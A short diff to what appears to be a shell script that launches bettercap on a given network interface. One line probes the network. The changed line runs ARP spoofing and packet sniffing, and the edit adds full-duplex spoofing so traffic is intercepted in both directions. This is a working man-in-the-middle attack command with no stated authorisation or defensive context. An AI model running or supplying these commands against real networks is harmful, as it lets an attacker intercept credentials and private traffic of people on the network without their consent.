@@ -23,4 +23,4 @@ echo
 echo
 #netdiscover -i $1
 bettercap -iface $1 -eval "net.probe on; ticker on "
-bettercap -iface $1 -eval "net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on"
+bettercap -iface $1 -eval "net.probe on; set arp.spoof.targets; arp.spoof.fullduplex true; arp.spoof on; set net.sniff.verbose false; net.sniff on"
